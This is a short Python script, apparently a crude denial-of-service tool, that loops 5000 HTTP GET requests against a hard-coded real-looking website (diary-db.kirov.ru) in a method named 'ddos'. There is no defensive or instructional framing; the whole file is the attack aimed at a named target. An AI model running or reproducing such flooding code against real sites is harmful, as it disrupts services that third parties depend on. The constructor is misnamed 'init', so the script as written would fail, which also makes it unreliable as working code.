
import requests
import os
import time


class Site(object):

    def init(self, url):
        self.url = url

    def ddos(self):
        print(self.url)
        for i in range(0,5000):
            response = requests.get(self.url)
            print(f"{self.url} - {response}")
        os.system('cls')


lists = ['http://diary-db.kirov.ru/']
for i in range(0,len(lists)):
    url = Site(lists.pop(0))
    url.ddos()
input()